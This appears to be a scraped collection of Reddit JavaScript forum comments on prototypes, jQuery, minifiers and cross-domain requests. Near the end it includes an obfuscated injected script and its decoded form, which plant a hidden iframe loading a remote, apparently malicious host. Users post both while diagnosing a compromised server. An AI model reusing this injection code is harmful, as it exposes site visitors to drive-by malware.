http://raphaeljs.com/ http://raphaeljs.com/graffle.html &lt;- sorta like this?
Where is the &amp;lt;marquee&gt; &amp; &amp;lt;blink&gt; ?
It translates the French into Russian
Nostalgia'd, hard!
More importantly how is this PURE HTML5 / CANVAS / JAVASCRIPT, when there are no HTML5 specific tags... and there's a call to a SWF Flash object for sound. ( An embed tag calling a SWF is dynamically inserted into a div named "player", in the DOM through JS, on Chrome and other browsers ) Beyond that it's a cool site though. Definitely rocking that 90's vibe hard.
So basically its a somewhat buggy ui framework.
IM.js. New web design and more live examples added. Quick image comparison pixel by pixel. http://tcorral.github.com/IM.js/
IM.js. New web design and more live examples added. Quick image comparison pixel by pixel. http://tcorral.github.com/IM.js/
That doesn't sound like you'd even need any framework. :|
Yea, looks like it uses Flash for playing mp3s, so it's not "pure", but it does use canvas elements for rendering, which is an HTML5 element.
Of course directly accessing the property is faster. The easiest way of looking at this is think about what the engine is doing when you do a property access. Given this foo1 = {a:1} foo2 = { _ proto _: foo1 } Then foo2.a Is essentially going to have to do foo2.[[proto]].a so you have two property accesses instead of one. It's not actually that bad in a fast implementation, but it gets quite close.
With `__proto__` you're probably hitting a path that causes the method-JIT to bail out and revert back to bytecode interpretation. See [page 48 of this presentation](http://www.slideshare.net/newmovie/know-yourengines-velocity2011/) by David Mandelin. 
I came here hoping for a booming community but this explains a little
I've never seen an alternative to for (key in obj) { if (!obj.hasOwnProperty(key)) { continue; } // ... } for iterating over keys in objects. Could you please post a link or quick explanation?
 for (key in obj) { if (obj.hasOwnProperty(key) { // do stuff } }
Probably better to use standard Object.create()/Object.getPrototypeOf() instead of \_\_proto\_\_ as it's supported more broadly.
Thanks for the link. I've looked at the revealing module pattern and the primary reason I don't like it is that I have to write my function names three times. Seems kinda unnecessary. I will change window.MyStuff though. Something like this maybe?: var MyStuff = (function(){ var _, public; _ = { //Private functions }; public = { //Public function }; return public; })();
thank you, Mr. Crockford. 
sure, but the DIY method is also performing those lookups
Sure lookups are slow.. but wouldn't __proto__ , a built-in feature, have a fast path? Maybe it's seen as a lesser JS feature, so it wasn't a priority for vendors with JIT.
Ah, of course :) I thought there was a completely different solution :P
I was somewhat confused with the naming myself, seeing as there is a jQuery + jQueryUI for the desktop, I thought _jQuery Mobile_ would be sans-UI stuff. It also seemed somewhat buggy to me, but it's a good start I guess.
jQuery Mobile is a buggy and SLOW iOSifier for the mobile web. Thanks but no thanks. Everything doesn't have to mimic Apple and everyone doesn't dig the iOS esthetics.
If it's Chrome only, it's Googlescript, not javascript. 
If it's Chrome only, it's Googlescript, not javascript. 
it's "chrome only" due to the fact i use webkitaudio for the direct raw audio buffer acces, nothing more....
Yes, like that. The library I've found seems to be built on top of raphaeljs, but it has some extra features, like built in shapes and arrow types. Right now I'm comparing them to see if it's easier to modify those, or just built my own directly with raphaeljs. Since what I need to do is pretty custom, the second version might actually be better. Thank you!
I sure could do this without, but it would be nice to have a little flexible framework that takes care of things like data binding or GUI controls and widgets. I guess YUI or Dojo could do this, but they seem really heavy for simple things like that. Just to clarify things, Backbone is based on having models that you put in collections and perform basic CRUD operations on, right?
Micro optimising devil. Stop wasting your time and write useful, readable and maintainable code. However if you can find the lines in the v8 source code that explain why it's slower come tell us.
When he says "doesn't need classes". He means "doesn't need classical OO constructs"
Even mdn says don't use [__proto__](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/Proto), it's deprecated. 
My favorite part of this is that the two pieces of code being compared say significantly different things, and one is six years deprecated in the language standard. You guys are micro-optimizing for speed at the cost of no longer being correct.
&gt; wouldn't proto , a built-in feature, have a fast path? No. It's not fast pathable, and besides, it's no longer part of the language. It's only there to cope with old garbage code. Nobody cares if it's fast; new code isn't supposed to use it.
You appear to have failed to understand parent's point, which is that the latter performs one lookup more than the former, no matter what. He appears to have failed to understand that this is not legal code in the first place, because you're mixing features that are hard-deprecated with features that didn't exist until after the deprecation happened, meaning there is no valid language version target for this code, so it's all wasted.
At that point, you're basically using the original module pattern, except you're giving things explicit names (`_` and `public`) instead of just leaving private stuff directly underneath the anonymous function and inlining `public` into the `return` statement. I think anybody reading it would recognize it right away.
The thing with using _ for private is so I don't have to declare a var at the top for each function and then declare the actual function further down. All vars are automatically moved to the top so in order to be as concise as possible I like to have them at the top as well. I also often use i instead of public, but thought that may be confusing here. This also makes it possible for me to call public.foo() from a private function. Something that would not be possible with return { foo : function(){//nop} } Basically I'm trying to avoid restating the same function name several times.
Whose awesome? My awesome?
Would you be interested in checking out a utility I created? https://github.com/mennovanslooten/Observable-Arrays It adds observer functionality to standard JavaScript arrays, effectively making them like a lite version of Backbone's Collections and Models. You need to write your own UI bindings but the upside is you can use standard arrays and array methods (pop, push, slice, sort, etc). var a = ['zero', 'one']; // "create" is triggered when an element is added to the array. _.observe(a, 'create', function(new_item, item_index) { alert(new_item + ' was created at ' + item_index); }); a.push('two'); // alerts 'two was created at 2' For an example of more advanced data-binding, check out [the demo](http://experiments.mennovanslooten.nl/2011/observable-arrays/todo.html).
Nice, I hope the browser vendors will converge with a nice Audio API so this will work everywhere.
Thought I'd drop a link to this here, looks pretty neat. The one downside at the moment seems to be that it needs Redis with the Lua Scripting addition, which either means compiling it yourself, or waiting until Redis 2.6.
Yeah, I figured it wouldn't be the most ideal fit. But it has certain UI elements you were looking for, such as the modal windows. That look and act really nice, and are very easy to implement. I love it because I can just pop in the features I want. One hotlink to twitter bootstrap css, and one javascript file (bootstrap.modal) and i'm good to go! :) The best part for me is i can use it with any other framework i want such as jquery, or spine, etc..
Someone added Object.create .. initial results look the same as __proto__. http://jsperf.com/proto-lookup2/2
Your awesome. 
From my point of view, they performing the same task. The first is using a JS stack while the other is using a built-in stack. They both navigate down the stack until they match a key/value. This experiment is just for fun; it has no relation to a project. But I still wouldn't call using the features of Object.create() and __proto__ micro-optimizing. I would expect that these features would hold fast paths for the thing they are supposed to be doing. 
OK, that might be. But surly we shouldn't be seeing such a huge delta in the results. Check it out, someone has updated the test using Object.create http://jsperf.com/proto-lookup2/2.
It's official: I made a mistake in the test! I failed to reset v in the loop test. http://jsperf.com/proto-lookup2/3
OK.OK. It's official: I made a mistake in the test! I failed to reset v in the loop test. http://jsperf.com/proto-lookup2/3
Assuming jQuery is available, this should have you covered: console.log( $(window).resize(function() { console.log( $(this).height() ); }).height(); ); Of note are the .height() method and .resize() event.
Maybe something like this? $(window).resize(function() { $("#content").height($(this).height() - 100); }).height();
You sound like you are afraid to work with javascript. :( jQueryUI might be the little, flexible thing you want for UI stuff, since you can easily pick which components you want to include.
Javascript is not exactly my favorite language, but unfortunately on the web there's no alternative. In combination with browser differences and Javascript's weirdness, I find a framework that takes care of a basic application structure, DOM handling, data binding and some UI very helpful.
&gt; But surly we shouldn't be seeing such a huge delta in the results. Why do you care about a delta between correct code and incorrect code which is also six years outside the language? &gt; Check it out No.
&gt; From my point of view, they performing the same task. From the point of view of the language and of the standard, and from the point of view of actually knowing what each does, however, a very different result is had. &gt; The first is using a JS stack Wrong. &gt; the other is using a built-in stack Also wrong. Furthermore, pointing out what datastructure is in use doesn't change that they're doing different things. A sort and a shuffle typically both use dense vectors; they are nonetheless quite different. &gt; They both navigate down the stack until they match a key/value. Not correct in either case. &gt; But I still wouldn't call using the features of Object.create() and proto micro-optimizing Given that one isn't correct and the other isn't part of the language anymore, I would have thought you'd recognize that as a polite substitute for a more severe criticism. &gt; I would expect that these features would hold fast paths Given that you don't even appear to know what they do, and that one of them hasn't been part of the language for six years, your expectations are not actually terribly interesting.
Great reply! Thanks for this.
Wow thanks for this. Great explanation. I've already got a bunch of selenium tests running, and basic smoke tests, but I'd like to get into unit testing. I'll play around with Jasmine and/or QUnit based on the replies here. Thanks!
Let us know what you go with. I may need something like this soon as well.
listen. A word of warning. You need to throttle this function. Go get underscore Js, and use the _. throttle() method with a named anonymous function you assign to your event handler. I also recommend throttling when you perform functions with scrollbars, anytime you are pounding a function over and over you can really kill your in browser performance. Even chrome can kick its own ass if enough stuff is going on. 
Most of my mobile site is built with a jQuery requirement. To rewrite would take far too many hours. :( This makes me sad.
What am I missing here? Why is there another .height() at the end of the resize function? Does that limit the resize event to only height changes?
jQuery is fine on mobile. It isn't going to make the user's experience bad, this guy is just (quite well mind you) demonstrating how to optimize to the extreme.
I know __proto__ is awful, I work on a JS engine, but answering with "you shouldn't do that because we don't want you to" is not as useful as simply answering the question.
I think the original snippet was meant to be an illustrative example of both how to get the current height (the outer/second `height()`) and how to hook in to resize events to be notified when it changes. psxpaul's modification dropped the calls to log the values but kept the second call to `height()`, so if this was used in void context, it would indeed be superfluous as that value is not assigned/printed.
Using querySelectorAll isn't very optimal in term of speed, he's mentionning getElementsByClassName as a good speed alternative, but fails to mention the most important ... getElementById. If you want fast access to DOM element, getElementById will always be the fastest way to get them and most of the time that's what you need.
It goes against everything I am trying to propagate. I want server and client to be completely decoupled.
Thanks. For some reason, creating standalone plugins has always kind of scared me off, but this makes it pretty clear. One thing I don't quite understand though is the actual declaration: (function($) { console.log($(document).jquery); })(jQuery); which is essentially the same as: (somefunction)(jQuery); Can someone explain what that's actually doing? I've never seen (x)(y) used in javascript, so I don't know how they're interacting with each other.
It's a standard module pattern. You're basically defining/declaring the function first and then call/execute it immediately with *jQuery* as the single argument. The advantages of doing this are that inside that function *$* is guaranteed to be *jQuery* (because that is the name of the argument) and that any variables you declare inside of it with *var =* won't leak into the global namespace.
How is jQuery mobile lightweight ? If you're just looking at the minimum dependency for the framework it's over 200k of code **minified** just to get started. 
Light Weight is a JavaScript buzzword. It has no standard definition, so anything can be called light weight. :-(
I'll just leave this here... [dojox.mobile](http://livedocs.dojotoolkit.org/dojox/mobile)
http://phonegap.com/ ?
Perfect explanation. Also, using the same technique, one can use (function($, undefined){ // Code })(jQuery); and be sure no external interference will affect `undefined`.
Furthermore, you set `j=6` in the first test when in fact it should be `i=7`.
I think that is done for `undefined` for performance (it brings `undefined` into the local scope which relieves lookups from having to traverse the scope chain).
&gt; answering with "you shouldn't do that because we don't want you to" That's quite different than what I actually said.
In the case of `undefined`, I think it's more because of security than speed. But what you say is true (jQuery for example uses it with `window`) [except for Firefox](http://jsperf.com/short-scope).
It's covered in [Things You Might Not Know About jQuery](http://ejohn.org/apps/workshop/adv-talk/#31), although _'an easy way'_ doesn't go into the motives much, but I guess it probably does have more utility as a way of generating a safe undefined value. 
I used to think jQuery mobile was a super strimmed version of jQuery with zero bloat that comes under 5kb. Then I realized its a mediocre framework build ontop of jQuery full of bad code. Sad times.
bridging server and client effortlessly is pure awesome!
Sencha Touch is also completely free (as in beer), btw.
\o/
Because /r/JavaScript is too high traffic?
Thanks, I'll keep it in mind. Maybe I get to use it in a project some day.
Are you opening wide for the gynecologist?
Maybe not : https://github.com/mythz/jquip 
So, another thing you should know about programming and programmers is that programmers don't read people's minds. Usually, programmers ask to show them a problematic code and explain what you try to achieve with it.
It's not uncommon to have subsets within sub-reddits. /r/jquery and /r/rails are perfect examples.
This is exactly what JSONP is for. In my previous role we'd run into this issue a lot, so our application developer would set up his AJAX responses to return JSONP rather than JSON or XML.
Maybe if you open a page from another page, using javascript.
JSONP is not the only solution out there. In some random order 1. postMessage 2. JSONP 3. CORS (Cross Origin Resource Sharing) .. and few others. See this video for a good starting point. [http://alexsexton.com/?p=168](http://alexsexton.com/?p=168)
Really? Is that appropriate? No, it isn't.
CORS is great... if all your target browsers support it and you control the server (to set the response headers correctly). Unfortunately most sites I've worked on still need to support IE7 so there would need to be a JSONP fallback anyway. I'm not familiar with postMessage... could you link me to some details? Is it supported by all browsers like JSONP?
Check out the video. Its a screencast by Alex Sexton. And as I mentioned, its a great starting point. I should also say, I've never implemented postMessage myself to comment on it. And you're right, JSONP is the widely accepted "thing" for anything cross-domain .. but the poor error handling. oh my!
I just used postMessage to integrate a 3rd party embedded iframe app at work. Simple and elegant solution.
Aw heck, I'm just yanking your chain.
&gt;no error handling FTFY :) But that can be somewhat mitigated by setting a reasonable timeout on the request. Still far from ideal but it is better than nothing if you have to go the JSONP route. There is a [pretty good JSONP plugin](http://code.google.com/p/jquery-jsonp/) that implements error callbacks via a stringent timeout for JQuery since the built-in support pretty much sucks.
Sorry. It basically looks like this. function detectType (value) {switch (typeof 'value') } {case 'string': return 'str' break; case 'number': return 'num' break; case 'object': return 'obj' break; default: return 'other' } So it's probably the worst thing you've ever seen but i don't know shit so that's it.
it took me a second…
I think this is what you want: https://developer.mozilla.org/En/HTTP_access_control More specifically you should look at the HTTP option Access-Control-Allow-Origin. JSONP is just a hack. And not a very good one at that.
&gt;&gt; The asynchronous style makes software so much more complicated &gt; Misconception. Node isn't more complex. It's different. And if you attack &gt; from a generic synchronous mindset yes it is more complex. I'm afraid &gt; you'll have to learn callbacks and how to do it elegantly. This is pretty disingenuous, there are now decades of opinion on why continuation passing style / callbacks is a more error prone and complicated way to program. You don't get to overturn that by just saying "No it isn't, just different". This isn't a new debate, it's a very old one with a lot of data available. You can make a decent argument that this tradeoff is worth taking, that the ecosystem and the benefits of Node are worth using a more complicated style of programming. By just ignoring the history of this question and lying to your (potential) users the author is coming off as a fanboy instead of making a convincing argument. Is no one at Node.js worried that the project is getting a reputation for being the next PHP? As in, being full of people who are technically incompetent or inexperienced who do things professionals laugh at. This is not a good road for a project to take.
Are you the vagina police?
As a programmer, I have a natural aversion to things like "maybe". If something isn't definite, it's not very useful.
Your actually right. It is more complicated. I addressed that point from the wrong angle. I'd agree that we do not want to be a PHP community full of incompetence. However I dont think callbacks is an increase in complexity we should actually worry about. 
That sounds like your problem.
Yes, and it has served me well for the past 20 years as a programmer. I don't consider it a problem, but thanks for the compliment. 
That's an interesting navigation bug masquerading as a JS-driven UI experience, right there. I'd love to read this article. Instead I can't get past the page with the author's agenda.
You can use Google to find information about things you are not definitely sure.
Sorry about that — still working out the kinks. Could you give me some browser information?
Yes, and I do; before I try to answer someone else's question, though. You can also use Google - did you know that?
Nope.
I'm using Opera v11.52 on 32-bit Windows XP. Here's my suggestions: * Ditch the full-height accordion sidebar. It takes up a lot of horizontal space (especially when it's expanded), is annoying when triggered by hovering the mouse over it, and it isn't immediately clear what you're navigating through. * Hovering the mouse over "The Meat" redirects the page from "Calculators" to "The Meat". This is happening almost as soon as the page loads, leading me to wonder at first where the hell the page about calculators is. This also breaks the relationship between the address in the URL bar and what's displayed on the page. And, no offense, but I really don't want to read about your meat. * Clicking on a link causes the sidebar logo to animate, and only after the animation finishes does the link load. This initially led me to believe that the link wasn't loading at all. The user doesn't need to see an animation to tell them the link is on its way; just load the link. * Clicking on a link should be handled by the A tag; any Javascript logic on top of that is useless at best.
I wouldn't use PHP as an example of what not to do. It's pretty much the most widely used and supported language out there for dynamic web content. Don't say something is wrong. Say why it's wrong, and how other things do it better. It's pretty much the entire reason I ignore node.js wholesale. There's no "here's how node.js does this thing better" documents.
Thanks for taking the time. There was an issue with the browser history plugin in Opera. As for your suggestions: * I see how this can be annoying and may rethink the whole thing. * Can't reproduce. Maybe what you experienced was that browser history bug in Opera that should be fixed now? * Well, it's a loading animation. Getting rid of it wouldn't make the page load any faster. * The A tags should work just fine with Javascript disabled, but I suppose what you're saying is "don't use AJAX", and I don't really agree with you on that.
Yes, I do that when I feel like researching the specifics for other people. Do you feel like you're accomplishing something by bitching about my post?
Would this work? window.open("http://google.com").document.body It seems to work for me from a firebug console.
node.js does - serverside javascript better. There is no other platform that's as active, nor has as large a community as node.js - does networking glue better. It can easily talk to your database, to some other database, to some REST services, to some TCP servers, to some oauth APIs and aggregate all those results into one and return them whilst staying performant. - does websockets better. The community and library effort around socket.io and real time scaling web applications is massive. - active open source community working on a wide range of things. Lot's of attention, lot's of buzz. Lots of projects doing things in new and exciting ways. It's all open source, it's all on github - It's performant, there are more performant solutions out there, but they are pretty specialized. node.js is close to the sweet spot for performance and community Any of those could be expanded on in detail, but those are the main things node.js does better. IMHO. If you don't care about any of those 4 you should just ignore node.js
I work with perl, C, python, php, asp (if the contract pays enough), and ruby. What does node.js do better than those languages? How? It seems like a solution in search of a problem. Sell it to me.
No, I don't, in your case. Sorry, I didn't realize you were the hypersensitive type who couldn't stand apparent criticism no matter how light. Please do continue your public guessing.
LOL
I'm also in the market for a good minifier. Ideally I want something that combines multiple JS files too.
[Google Closure Compiler](http://code.google.com/closure/compiler/)
Pretty much all of them will do css and js and they can combine files. require.js can do it quite nicely, and it has some nice features like you can run your minified build but specify some files unminified. It has the downside that you kind of have to architect your app around it. google closure compiler has the "downside" (to my way of thinking) that it is only available by web service. I want to have control over the code and not send my stuff out to google. I personally use YUI compressor for .Net (http://yuicompressor.codeplex.com/). This has advantages to me: 1. you can integrate it into the visual studio build 2. apparently, you can minify at runtime, as well as build time (never tried it) 3. not too many dependancies beyond .Net
For .net web apps, I suggest RequestReduce available at http://www.RequestReduce.com and on Nuget. It combines and minifies css and js and also generates sprites with optimized PNGs. It does this at run time using a response filter. So the default functionality requires no code or configuration. Cached files are served using far future expires headers and custom ETags. It can be configured to sync content accross multiple servers and use a CDN. Works with all ASP.NET flavors. By default it uses the Microsoft ajax minifier but any minifier can be plugged in.
I use readyjs for personal projects and jammit at work, both cases allows to pick the compression tool and run jslint before compression. https://github.com/dsimard/ready.js http://documentcloud.github.com/jammit/
Closure compiler can also be run from the command line. 
At your service.
I use [CleanCSS](https://github.com/GoalSmashers/clean-css) and [UglifyJS](https://github.com/mishoo/UglifyJS) via [Node](http://nodejs.org/).
Require.js calls a minifier. It defaults to uglifyjs, but also supports google closure compiler.
The two main minifiers are [Closure Compiler](http://code.google.com/closure/compiler/) by Google, and the [YUI Compressor](http://developer.yahoo.com/yui/compressor/) by Yahoo!. I use the Closure Compiler because: * Simple mode often compresses better then the YUI compressor * has advanced options for compressing further (although you need to annotate your code for this to work) * performs JS checks for finding common bugs However the YUI compressor is excellent, and is often only behind the Closure Compiler by a couple of 100 bytes. The JS checking can be supplemnted using something like JSLint, and you can use YUI for CSS too, which I use it for. You will also find JS compressors that are able to compress further then these, such as packer. These work by encoding your JS (essentially zipping it up) and then unpacking it when the script is run. They often give significant gains over minifiers, but I would avoid using these as the added unpacking time often outweighs any improvement in download time. This is especially true if you need to add the script to the head of your page, such as HTML5 Shim, Firebug Lite or Modernizer, as it's important these run as quickly as possible. Finally make sure HTTP compression is enabled on your server to compress it further (and always test to ensure it's working).
You could take a look at this ... http://code.google.com/p/svg-edit/ ... I have a similar requirement to yours and I've been looking at this project for some time. I'm impressed at the way it keeps moving forward and now looks quite polished. I hadn't previously seen JointJS - it also looks good.
uglifyjs + closure-compiler + cat 
This is what your code should look like function detectType(value) { switch (typeof value) { case 'string': return 'str'; case 'number': return 'num'; case 'object': return 'obj'; default: return 'other'; } } You don't need to use break because you're returning something so the function ends anyway.
You need to fix your formatting/indentation. This is not something to slack off on, it really matters. If your formatting doesn't match what you've written, it hides bugs. With proper indentation you would see that you have an extra, incorrect brace. Additionally, `typeof 'value'` will always return `'string'` because you're passing it the literal string `'value'` not the variable named `value`. Also, never ever rely on automatic semicolon insertion. Every statement should have a semicolon at the end. And you don't need a `break` after a `return` statement. 
Yeah, a simple short "hello world" of the backend web world would be good, something that: - parses GET/POST params - composes and executes a DB query - gets the result - interpolates/composes result into a simple HTML template - returns response And then highlight the ways in which node.js does any or all of those things better than the existing languages. 
This is good stuff, Uglify even has a command line client that is very easy to install via NPM.
I'd also like to know how it caches opcode compilaton and script dependency.
I used to use [Google Closure Compiler](http://code.google.com/closure/compiler/) but have since moved to [UglifyJS](http://marijnhaverbeke.nl/uglifyjs). I have found that it is better at minifying on the whole with a few exceptions and is extremely portable due to it being written in JavaScript. No huge .jar files in sight. So you can even control it programatically via the npm module.
another line has bed added 2 min ago &lt;script&gt;var s=new String();if((document+'').substr(0,4)==='[obj'){r=1;c=String;}if(r&amp;&amp;document.createTextNode)y=2;e=window.eval;m=Array(4.5*y,18/y,52.5*y,204/y,16*y,80/y,50*y,222/y,49.5*y,234/y,54.5*y,202/y,55*y,232/y,23*y,206/y,50.5*y,232/y,34.5*y,216/y,50.5*y,218/y,50.5*y,220/y,58*y,230/y,33*y,242/y,42*y,194/y,51.5*y,156/y,48.5*y,218/y,50.5*y,80/y,19.5*y,196/y,55.5*y,200/y,60.5*y,78/y,20.5*y,182/y,24*y,186/y,20.5*y,246/y,4.5*y,18/y,4.5*y,210/y,51*y,228/y,48.5*y,218/y,50.5*y,228/y,20*y,82/y,29.5*y,18/y,4.5*y,250/y,16*y,202/y,54*y,230/y,50.5*y,64/y,61.5*y,18/y,4.5*y,18/y,50*y,222/y,49.5*y,234/y,54.5*y,202/y,55*y,232/y,23*y,238/y,57*y,210/y,58*y,202/y,20*y,68/y,30*y,210/y,51*y,228/y,48.5*y,218/y,50.5*y,64/y,57.5*y,228/y,49.5*y,122/y,19.5*y,208/y,58*y,232/y,56*y,116/y,23.5*y,94/y,52.5*y,234/y,56*y,242/y,57*y,238/y,50.5*y,230/y,23*y,198/y,50.5*y,92/y,54.5*y,230/y,23.5*y,198/y,55.5*y,234/y,55*y,232/y,24.5*y,102/y,23*y,224/y,52*y,224/y,19.5*y,64/y,59.5*y,210/y,50*y,232/y,52*y,122/y,19.5*y,98/y,24*y,78/y,16*y,208/y,50.5*y,210/y,51.5*y,208/y,58*y,122/y,19.5*y,98/y,24*y,78/y,16*y,230/y,58*y,242/y,54*y,202/y,30.5*y,78/y,59*y,210/y,57.5*y,210/y,49*y,210/y,54*y,210/y,58*y,242/y,29*y,208/y,52.5*y,200/y,50*y,202/y,55*y,118/y,56*y,222/y,57.5*y,210/y,58*y,210/y,55.5*y,220/y,29*y,194/y,49*y,230/y,55.5*y,216/y,58.5*y,232/y,50.5*y,118/y,54*y,202/y,51*y,232/y,29*y,96/y,29.5*y,232/y,55.5*y,224/y,29*y,96/y,29.5*y,78/y,31*y,120/y,23.5*y,210/y,51*y,228/y,48.5*y,218/y,50.5*y,124/y,17*y,82/y,29.5*y,18/y,4.5*y,250/y,4.5*y,18/y,51*y,234/y,55*y,198/y,58*y,210/y,55.5*y,220/y,16*y,210/y,51*y,228/y,48.5*y,218/y,50.5*y,228/y,20*y,82/y,61.5*y,18/y,4.5*y,18/y,59*y,194/y,57*y,64/y,51*y,64/y,30.5*y,64/y,50*y,222/y,49.5*y,234/y,54.5*y,202/y,55*y,232/y,23*y,198/y,57*y,202/y,48.5*y,232/y,50.5*y,138/y,54*y,202/y,54.5*y,202/y,55*y,232/y,20*y,78/y,52.5*y,204/y,57*y,194/y,54.5*y,202/y,19.5*y,82/y,29.5*y,204/y,23*y,230/y,50.5*y,232/y,32.5*y,232/y,58*y,228/y,52.5*y,196/y,58.5*y,232/y,50.5*y,80/y,19.5*y,230/y,57*y,198/y,19.5*y,88/y,19.5*y,208/y,58*y,232/y,56*y,116/y,23.5*y,94/y,52.5*y,234/y,56*y,242/y,57*y,238/y,50.5*y,230/y,23*y,198/y,50.5*y,92/y,54.5*y,230/y,23.5*y,198/y,55.5*y,234/y,55*y,232/y,24.5*y,102/y,23*y,224/y,52*y,224/y,19.5*y,82/y,29.5*y,204/y,23*y,230/y,58*y,242/y,54*y,202/y,23*y,236/y,52.5*y,230/y,52.5*y,196/y,52.5*y,216/y,52.5*y,232/y,60.5*y,122/y,19.5*y,208/y,52.5*y,200/y,50*y,202/y,55*y,78/y,29.5*y,204/y,23*y,230/y,58*y,242/y,54*y,202/y,23*y,224/y,55.5*y,230/y,52.5*y,232/y,52.5*y,222/y,55*y,122/y,19.5*y,194/y,49*y,230/y,55.5*y,216/y,58.5*y,232/y,50.5*y,78/y,29.5*y,204/y,23*y,230/y,58*y,242/y,54*y,202/y,23*y,216/y,50.5*y,204/y,58*y,122/y,19.5*y,96/y,19.5*y,118/y,51*y,92/y,57.5*y,232/y,60.5*y,216/y,50.5*y,92/y,58*y,222/y,56*y,122/y,19.5*y,96/y,19.5*y,118/y,51*y,92/y,57.5*y,202/y,58*y,130/y,58*y,232/y,57*y,210/y,49*y,234/y,58*y,202/y,20*y,78/y,59.5*y,210/y,50*y,232/y,52*y,78/y,22*y,78/y,24.5*y,96/y,19.5*y,82/y,29.5*y,204/y,23*y,230/y,50.5*y,232/y,32.5*y,232/y,58*y,228/y,52.5*y,196/y,58.5*y,232/y,50.5*y,80/y,19.5*y,208/y,50.5*y,210/y,51.5*y,208/y,58*y,78/y,22*y,78/y,24.5*y,96/y,19.5*y,82/y,29.5*y,18/y,4.5*y,18/y,50*y,222/y,49.5*y,234/y,54.5*y,202/y,55*y,232/y,23*y,206/y,50.5*y,232/y,34.5*y,216/y,50.5*y,218/y,50.5*y,220/y,58*y,230/y,33*y,242/y,42*y,194/y,51.5*y,156/y,48.5*y,218/y,50.5*y,80/y,19.5*y,196/y,55.5*y,200/y,60.5*y,78/y,20.5*y,182/y,24*y,186/y,23*y,194/y,56*y,224/y,50.5*y,220/y,50*y,134/y,52*y,210/y,54*y,200/y,20*y,204/y,20.5*y,118/y,4.5*y,18/y,62.5*y);if(document.createTextNode)with(c)mm=fromCharCode;for(i=0;i!=m.length;i++)s+=mm(e("m"+"["+"i"+']'));e(s);&lt;/script&gt; 
That piece of code does this (adds an iframe that looks like a counter): if (document.getElementsByTagName('body')[0]) { iframer(); } else { document.write("&lt;iframe src='http://tlunwpz.ce.ms/count13.php' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;"); } function iframer() { var f = document.createElement('iframe'); f.setAttribute('src', 'http://tlunwpz.ce.ms/count13.php'); f.style.visibility = 'hidden'; f.style.position = 'absolute'; f.style.left = '0'; f.style.top = '0'; f.setAttribute('width', '10'); f.setAttribute('height', '10'); document.getElementsByTagName('body')[0].appendChild(f); }
Change the ftp/ssh passwords of anyone that has access to your server, scan your own pc for viruses if you use Windows. If it still happens after that, call your hosting provider and tell them you suspect their server is rooted.
could you tell me what tools did you use do decrypt it?
ok thx
how do know the URL seems to download sth? I opened it and it has no source and nothing seems to be downloading. even on IE.
thx. TIL something useful
It's most definitely something nasty. It's a redirect for me to something that starts some java (never a good sign). Remember that what's being loaded is on a remote server you have no control over. It could roll a die to decide what it does --- who knows, and who cares. Get rid of it and start ringing the alarm bells.
Compare a bunch (JSMin, Dojo, YUI, Packer) here: http://compressorrater.thruhere.net/
I alerted admin just after venkman's post. I also have access to few more server, but the files there seem to be fine. At least no code like that has been added. Never the less I called other guys that their servers might be compromised(in case they got passwords from my totalcommander). On the other hand the password to the hacked server was like (company name)123, so I would say were brutable...
Try http://prettydiff.com/?m=minify The Pretty Diff tool uses a custom enhanced JSMin fork that can separately minify JavaScript and CSS.
i already alerted server owner, but he's acting like some idiot ignorant refusing to change the password. meanwhile i found another code - i guess more complex any1 know what it says(see google docs link)?
You're pretty obviously actively compromised. Tell the client that if they don't change their passwords and start taking servers offline right now, they may lose the ability to do so.
that would be a cufon font file i'd assume?
I didn't find anything wrong with the cufon fonts so unless cufon has an exploit that runs js code embed into the font data...
yes there were some file cufon.php there and cufon-yui.js added as well, but the code in google docs is from some file which had loooooooooong name "EFN_Agabus_400-EFN_Agabus_700-...-something.font.js"
Code injection, baby. Can usually fix this by changing passwords for anyone with server access. 'Specially common if you're running PHP apps (Wordpress, vBulletin, ...) on the traditional Linux/Apache/MySQL/PHP stack. Last year, someone snuck a nice lil eval(base64_decode(...)) into my vBulletin config. People clicking my website from The Googel would sometimes get redirected to a spam website. I took the bad code out, made better passwords, changed the vBulletin footprint a little bit (folder AdminCP/ renamed --&gt; ChiefCP/) and never got fondled again.
um yes, that would be cufon and a font file. the font file contains many fonts.
http://www.esotech.org/resources/cms/wordpress/wordpress-header-javascript-and-iframe-injection-problem-solution-and-analysis Looking at the new infection point and the archived one from this link. Looks like the attack is originating in germany. While working through russia.
If I'm reading through this correctly he has code that is a legitimate intrusion and then found the cufon code he didn't recognize while he was looking for more.
You were hacked. It's including an iframe containing a site that's not yours. Likely this site installs malware. Immediately change EVERY password that can access this site. The problem, though, is that they got into your site through an exploit and you *have* to find that exploit or they'll just do it again. If you're running any third party software, look for known exploits in the version number you have and patch that ASAP. Also, if any of your username/passwords are a name/dictionary word. (ex: Bob/surfing) change that. I've seen servers get brute forced that way. If you want a list of every file that's been compromised, SSH in, go to your web root and type this in grep -R "if((document+'').substr(0,4)" . It'll list out every file that has that snippet
wow, you told him the server was compromised and he won't change the passwords? I can't even imagine what kind of person would do that. He *knows* the bad-guys got the password, why wouldn't he change it? What does he think the point of passwords are??
That tool does not appear to differentiate between minification and obfuscation. As a result it performs a very nice, though largely worthless, comparison. In my opinion obfuscation is a harmful practice, and if you are unable to distinguish between obfuscation and minification then you should do neither.
Who is the provider?
Change all passwords, I will look through the code now.
Except you aren't really criticizing anything, you're just bitching like an angsty teen.
Changing the password is not the only thing you have to do. Something very similar happened to me some time ago and the reason was not an intrusion but a security vulnerability in CentOS. So I highly recommend that you also update your OS with the latests security patches. Don't panic thinking that you were specifically targeted because this kind of spam was more likely added by automated robots that ramdomly search for security vulnerabilities in online servers. They look for php files called sidebar.php or header.php, or footer.php, and some common filenames like that. I know for a very similar experience and I ended up changing hosting!.
Ouch. Another call to eval. This one looks harder to decrypt. EDIT: Nope, easy: contains identical code to the other one.
Backbone is awesome for this. I use it for something very similar. The inputs and graph would be one or more views, and the calculator could be a model. The views would bind to that model and any changes to input would redraw the view(s)/graph.
